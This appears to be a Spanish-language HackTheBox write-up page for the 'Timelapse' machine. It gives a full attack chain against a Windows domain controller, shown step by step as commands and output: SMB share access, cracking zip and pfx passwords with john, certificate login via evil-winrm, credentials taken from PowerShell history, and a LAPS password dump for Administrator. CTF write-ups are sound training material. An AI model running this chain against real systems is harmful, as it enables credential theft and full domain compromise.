@@ -1,0 +1,145 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Timelapse HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/timelapse.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Timelapse HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Timelapse de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Timelapse de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Timelapse HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Timelapse HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Timelapse de la plataforma de HackTheBox","headline":"Writeup Timelapse HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Timelapse HackTheBox</h1>
+          <p>Resolución de la máquina Timelapse de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ nmap</span><span class="p" > 10.10.11.152
+Nmap scan report for 10.10.11.152
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5986/tcp  open  wsmans
+9389/tcp  open  adws
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown</span>
+</code></pre></div></div>
+
+<div><p>Observamos que el smb está abierto listaremos recursos, intentaremos conectarnos sin contraseña y descargar lo que sea posible</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ smbclient</span><span class="p" > -L 10.10.11.152
+Enter WORKGROUP\root's password:
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	Shares          Disk      
+</span><span class="s2" >❯ smbclient</span><span class="p" > //10.10.11.152/Shares
+Enter WORKGROUP\root's password:
+smb: \> ls
+  Dev                                 D        0  Mon Oct 25 14:40:06 2021
+  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021 
+smb: \> cd Dev
+smb: \Dev\> ls
+  winrm_backup.zip                    A     2611  Mon Oct 25 10:46:42 2021
+smb: \Dev\> get winrm_backup.zip 
+getting file \Dev\winrm_backup.zip</span>
+</code></pre></div></div>
+<div><p>Como el archivo esta protegido por contraseña intentaremos conseguirla con john y descomprimirlo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ zip2john</span><span class="p" > winrm_backup.zip > hashzip
+</span><span class="s2" >❯</span> <span class="p" >john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashzip
+Loaded 1 password hash (PKZIP [32/64])
+</span><span class="kd" >supremelegacy</span><span class="p">    (winrm_backup.zip/legacyy_dev_auth.pfx)
+Session completed</span>
+</span><span class="s2" >❯ unzip</span><span class="p" > winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password: </span><span class="kd" >supremelegacy<span class="p">
+  inflating: legacyy_dev_auth.pfx</span>
+</code></pre></div></div>
+<div><p>Nos queda un archivo legacyy_dev_auth.pfx el cual según este <a href="https://cloudbase.it/windows-without-passwords-in-openstack">articulo</a> podemos usar para extraer un certificado y conectarnos a winrm pero tambien necesitamos una contraseña asi que con john la conseguimos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ pfx2john</span><span class="p" > legacyy_dev_auth.pfx > hashpfx
+</span><span class="s2" >❯ john</span><span class="p" > --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashpfx
+Loaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 128/128 XOP 4x2])
+</span><span class="kd" >thuglegacy</span><span class="p">    (legacyy_dev_auth.pfx)
+Session completed</span>
+<span class="s2" >❯ openssl</span><span class="p" > pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key
+Enter Import Password: </span><span class="kd">thuglegacy<span class="p">
+Enter PEM pass phrase: </span><span class="kd">thuglegacy<span class="p">
+Verifying - Enter PEM pass phrase: </span><span class="kd">thuglegacy<span class="p"></span>
+<span class="s2" >❯ openssl</span><span class="p" > pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out crt
+Enter Import Password: </span><span class="kd">thuglegacy</span>
+</code></pre></div></div>
+<div><p>Ahora que tenemos ambos archivos podemos conectarnos con evil-winrm</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ evil-winrm</span><span class="p" > -S -i 10.10.11.152 -c crt -k key
+Enter PEM pass phrase: </span><span class="kd">thuglegacy<span class="p">
+PS C:\Users\legacyy\Documents> type ..\Desktop\user.txt
+801**************************51c
+PS C:\Users\legacyy\Documents></span>
+</code></pre></div></div>
+<div><p>Si ejecutamos <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20220605">winpeas</a> para buscar posibles formas de escalar privilegios nos encontramos que el historial tiene credenciales</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p" >ÉÍÍÍÍÍÍÍÍÍÍ¹ </span><span class="s2" >PowerShell Settings</span><span class="p">
+    PS history file: </span><span class="kd">C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt</span>
+<span class="p">
+PS C:\> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt
+$p = ConvertTo-SecureString '</span><span class="kd">E3R$Q62^12p7PLlC%KWaxuaV</span><span class="p">' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('</span><span class="kd">svc_deploy</span><span class="p">', $p)</span>
+</code></pre></div></div>
+<div><p>Con estas credenciales ademas de podernos conectar con evil-winrm ya que svc_deploy se encuentra en el grupo laps podemos dumpear una contraseña "temporal" para Administrator con la herramienta <a href="https://github.com/n00py/LAPSDumper">lapsdumper</a></p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ python3</span><span class="p" > laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
+DC01$:</span><span class="kd">[BoaRXLW,(Azb{99YV98L[KX</span><span class="p">
+<span class="s2" >❯ evil-winrm</span><span class="p" > -S -i 10.10.11.152 -u Administrator -p '</span><span class="kd">[BoaRXLW,(Azb{99YV98L[KX</span><span class="p">'
+PS C:\Users\Administrator\Documents> type C:\Users\TRX\Desktop\root.txt
+acf**************************1b6
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
